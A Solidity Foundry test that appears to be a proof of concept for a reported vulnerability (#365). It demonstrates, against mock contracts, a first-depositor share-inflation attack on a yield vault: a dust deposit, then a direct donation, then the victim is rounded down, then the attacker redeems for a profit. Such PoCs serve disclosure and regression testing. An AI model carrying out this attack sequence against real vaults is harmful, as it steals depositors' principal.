// ABOUTME: PoC for #365 — ArmadaYieldVault first-depositor share-inflation attack.
// ABOUTME: Attacker inflates share price via a direct spoke donation, then steals a victim's principal.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../contracts/yield/ArmadaYieldVault.sol";
import "../contracts/governance/ArmadaTreasuryGov.sol";
import "../contracts/aave-mock/MockAaveSpoke.sol";
import "../contracts/cctp/MockUSDCV2.sol";

/// @title YieldInflationPoC — demonstrates the #365 inflation attack end to end.
/// @dev Root cause: `deposit`/`redeem` are permissionless, `totalAssets()` reads the
///      live (externally-donatable) spoke balance, and there is no dead-shares/virtual-offset
///      defense. An attacker who is the first depositor can inflate the share price with a
///      direct `spoke.supply(..., address(vault))` donation and capture a later depositor's funds.
contract YieldInflationPoC is Test {
    ArmadaYieldVault vault;
    MockUSDCV2 usdc;
    MockAaveSpoke spoke;
    ArmadaTreasuryGov treasury;

    address attacker = address(0xA11CE);
    address victim = address(0x71C71);

    uint256 constant DONATION = 100_000e6; // 100k USDC donated directly into the vault's spoke position
    uint256 constant VICTIM_DEPOSIT = 150_000e6; // victim's honest deposit

    function setUp() public {
        usdc = new MockUSDCV2("Mock USDC", "USDC");
        spoke = new MockAaveSpoke();
        usdc.addMinter(address(spoke));
        spoke.addReserve(address(usdc), 500, true); // 5% APY reserve, reserveId 0
        treasury = new ArmadaTreasuryGov(address(this));
        vault = new ArmadaYieldVault(address(spoke), 0, address(treasury), "Armada Yield USDC", "ayUSDC");

        usdc.mint(attacker, 1 + DONATION);
        usdc.mint(victim, VICTIM_DEPOSIT);
    }

    function test_firstDepositorInflationStealsVictimPrincipal() public {
        // ─── Step 1: attacker is the first depositor with a dust deposit ───
        vm.startPrank(attacker);
        usdc.approve(address(vault), 1);
        uint256 attackerShares = vault.deposit(1, attacker);
        vm.stopPrank();

        assertEq(attackerShares, 1, "attacker should hold exactly 1 share");
        assertEq(vault.totalSupply(), 1, "supply == 1 after dust deposit");
        console2.log("share price after 1-wei deposit (assets per share):", vault.convertToAssets(1));

        // ─── Step 2: attacker donates directly into the vault's spoke position ───
        // MockAaveSpoke.supply credits shares to ANY onBehalfOf, so the vault's
        // totalAssets() jumps with no corresponding vault shares minted.
        vm.startPrank(attacker);
        usdc.approve(address(spoke), DONATION);
        spoke.supply(0, DONATION, address(vault));
        vm.stopPrank();

        uint256 inflatedPrice = vault.convertToAssets(1);
        console2.log("share price after donation (assets per share):", inflatedPrice);
        // Root cause proven: an unrelated party moved the share price from ~1 to ~90k+.
        assertGt(inflatedPrice, DONATION / 2, "share price was inflated by an external donation");

        // ─── Step 3: victim makes an honest deposit and is rounded down ───
        vm.startPrank(victim);
        usdc.approve(address(vault), VICTIM_DEPOSIT);
        uint256 victimShares = vault.deposit(VICTIM_DEPOSIT, victim);
        vm.stopPrank();

        console2.log("victim deposited (USDC):     ", VICTIM_DEPOSIT);
        console2.log("victim shares received:      ", victimShares);
        uint256 victimClaimable = vault.convertToAssets(victimShares);
        console2.log("victim claimable immediately:", victimClaimable);

        // The victim instantly loses value: their claimable is far below what they paid in.
        assertLt(victimClaimable, VICTIM_DEPOSIT, "victim's shares are worth less than they deposited");
        uint256 victimLoss = VICTIM_DEPOSIT - victimClaimable;
        console2.log("victim instant loss (USDC):  ", victimLoss);

        // ─── Step 4: attacker redeems their single share and walks away with the loot ───
        uint256 attackerUsdcBefore = usdc.balanceOf(attacker);
        vm.prank(attacker);
        uint256 attackerRedeemed = vault.redeem(attackerShares, attacker, attacker);
        uint256 attackerUsdcAfter = usdc.balanceOf(attacker);

        uint256 attackerCost = 1 + DONATION; // dust deposit + donation
        console2.log("attacker total cost (USDC):  ", attackerCost);
        console2.log("attacker redeemed (USDC):    ", attackerRedeemed);
        assertEq(attackerUsdcAfter - attackerUsdcBefore, attackerRedeemed, "redeem paid out to attacker");

        // The attack is profitable: attacker withdraws more than they put in, at the victim's expense.
        assertGt(attackerRedeemed, attackerCost, "attacker profits from the inflation attack");
        uint256 attackerProfit = attackerRedeemed - attackerCost;
        console2.log("attacker net profit (USDC):  ", attackerProfit);

        // The profit is drawn from the victim's deposit.
        assertGt(victimLoss, 0, "victim funded the attacker's profit");
    }
}
